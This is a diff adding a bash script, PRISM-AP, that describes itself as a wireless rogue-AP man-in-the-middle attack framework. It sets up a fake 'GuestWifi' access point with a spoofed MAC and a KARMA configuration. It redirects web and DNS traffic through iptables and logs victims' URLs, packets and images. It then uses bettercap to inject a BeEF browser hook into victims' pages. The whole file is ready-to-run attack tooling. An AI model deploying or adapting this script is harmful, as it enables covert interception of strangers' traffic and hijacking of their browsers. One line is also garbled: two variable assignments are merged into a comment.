@@ -1,0 +1,139 @@
+#!/bin/bash
+# PRISM-AP v1.0 by 1N3@CrowdShield - https://crowdshield.com 
+#
+# ABOUT:
+# PRISM-AP is a wireless RogueAP MITM attack framework.
+#
+
+OKBLUE='\033[94m'
+OKRED='\033[91m'
+OKGREEN='\033[92m'
+OKORANGE='\033[93m'
+RESET='\e[0m'
+
+function logo {
+	echo ""
+	echo ""
+	echo ' ________  ________  ___  ________  _____ ______                  ________  ________   '
+	echo '|\   __  \|\   __  \|\  \|\   ____\|\   _ \  _   \               |\   __  \|\   __  \  '
+	echo '\ \  \|\  \ \  \|\  \ \  \ \  \___|\ \  \\\__\ \  \  ____________\ \  \|\  \ \  \|\  \ '
+	echo ' \ \   ____\ \   _  _\ \  \ \_____  \ \  \\|__| \  \|\____________\ \   __  \ \   ____\'
+	echo '  \ \  \___|\ \  \\  \\ \  \|____|\  \ \  \    \ \  \|____________|\ \  \ \  \ \  \___|'
+	echo '   \ \__\    \ \__\\ _\\ \__\____\_\  \ \__\    \ \__\              \ \__\ \__\ \__\   '
+	echo '    \|__|     \|__|\|__|\|__|\_________\|__|     \|__|               \|__|\|__|\|__|   '
+	echo '                            \|_________|                                               '
+	echo "                                            by 1N3 @CrowdShield https://crowdshield.com"                                                                                       
+	echo ""   
+}
+
+logo
+
+# NOTE: Any changes made below will need to be updated manually in dhcpd.conf and the hostapd.conf.
+#
+WLAN='wlan0' # REPLACE WITH WIRELESS INTERFACE
+INET='eth0' # REPLACE WITH INTERNET INTERFACEINSTALL_DIR="/usr/share/prism-ap" # INSTALL DIRECTORY
+HOSTAPD='/usr/lib/mana-toolkit/hostapd' # MANA HOSTAPD PATCH
+HOSTAPD_CONF='karma.conf' # KARMA ATTACK CONFIG
+DHCPD_CONF="dhcpd.conf" # FULL PATH TO DHCPD.CONF
+MAC_ADDRESS='11:CA:44:10:41:62' # MAC ADDRESS TO SPOOF
+CHAN='6' # WIRELESS CHANNEL
+SSID='GuestWifi' # SSID OF AP
+
+cd $INSTALL_DIR 
+
+# INIT
+service network-manager stop
+rfkill unblock wlan
+ifconfig $WLAN down
+macchanger -r $WLAN
+ifconfig $WLAN up
+
+# CLEANUP
+iptables --flush 
+iptables --table nat --flush
+iptables --delete-chain
+iptables --table nat --delete-chain
+echo 0 > /proc/sys/net/ipv4/ip_forward
+killall hostapd dhcpd beef-xss beef ruby bettercap xterm driftnet wireshark tcpdump 2> /dev/null
+tar -zcvf $INSTALL_DIR/bak/logs-`date +%s`.bak.tar.gz $INSTALL_DIR/logs/
+sleep 5
+
+echo -e "$OKBLUE Do you want to start Evil AP?"
+echo -e "$OKBLUE =============================================================================== $RESET"
+read ans
+clear
+
+logo
+sleep 2
+
+# START HOSTAPD
+echo -e "$OKBLUE START HOSTAPD"
+echo -e "$OKBLUE =============================================================================== $RESET"
+$HOSTAPD -f $INSTALL_DIR/logs/hostapd.txt $INSTALL_DIR/conf/$HOSTAPD_CONF &
+sleep 5
+
+# SET IP ADDRESS
+echo -e "$OKBLUE SETTING UP NETWORKING"
+echo -e "$OKBLUE =============================================================================== $RESET"
+ifconfig $WLAN 192.168.1.1/24
+route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
+ifconfig $WLAN
+sleep 5
+
+# SET IPTABLES RULES
+echo -e "$OKBLUE SET IPTABLES RULES"
+echo -e "$OKBLUE =============================================================================== $RESET"
+iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
+iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 8443
+iptables -t nat -A PREROUTING -p tcp --destination-port 53 -j REDIRECT --to-port 5300
+iptables -t nat -A PREROUTING -p udp --destination-port 53 -j REDIRECT --to-port 5300
+iptables -t nat -A POSTROUTING -o $INET -j MASQUERADE
+iptables -A FORWARD -i $WLAN -o $INET -j ACCEPT
+echo '1' > /proc/sys/net/ipv4/ip_forward
+sleep 5
+
+# START DHCPD
+echo -e "$OKBLUE START DHCPD"
+echo -e "$OKBLUE =============================================================================== $RESET"
+dhcpd -d -cf $INSTALL_DIR/conf/$DHCPD_CONF $WLAN 2>&1 | tee $INSTALL_DIR/logs/dhcpd.txt &
+sleep 5
+
+# START URLSNARF
+echo -e "$OKBLUE START URLSNARF"
+echo -e "$OKBLUE =============================================================================== $RESET"
+urlsnarf -i $WLAN &
+sleep 5
+
+# START TCPDUMP 
+echo -e "$OKBLUE START TCPDUMP"
+echo -e "$OKBLUE =============================================================================== $RESET"
+tcpdump -l -A -s0 -i $WLAN -w $INSTALL_DIR/logs/tcpdump.pcap &
+sleep 5
+
+# START DRIFTNET
+echo -e "$OKBLUE START DRIFTNET"
+echo -e "$OKBLUE =============================================================================== $RESET"
+cd $INSTALL_DIR/logs/
+driftnet -i $WLAN &
+sleep 3
+
+# START BEEF
+echo -e "$OKBLUE START BEEF"
+echo -e "$OKBLUE =============================================================================== $RESET"
+cd /usr/share/beef-xss/ && ./beef --reset &
+sleep 7
+
+# START BEEF UI
+echo -e "$OKBLUE START BEEF UI"
+echo -e "$OKBLUE =============================================================================== $RESET"
+sleep 3
+echo "To view BeeF GUI, go to: http://127.0.0.1:3000/ui/panel"
+#firefox http://127.0.0.1:3000/ui/panel &
+
+# START BETTERCAP
+echo -e "$OKBLUE START BETTERCAP"
+echo -e "$OKBLUE =============================================================================== $RESET"
+bettercap -I wlan0 -X --log $INSTALL_DIR/logs/bettercap.log --no-spoofing --no-discovery --proxy --proxy-port 8080 --proxy-https --proxy-https-port 8443 --proxy-module injectjs --js-url "http://192.168.1.1:3000/hook.js" --dns-port 5300 --debug &
+
+echo -e "$OKBLUE ==============================================================================="
+echo -e "DONE! $RESET"
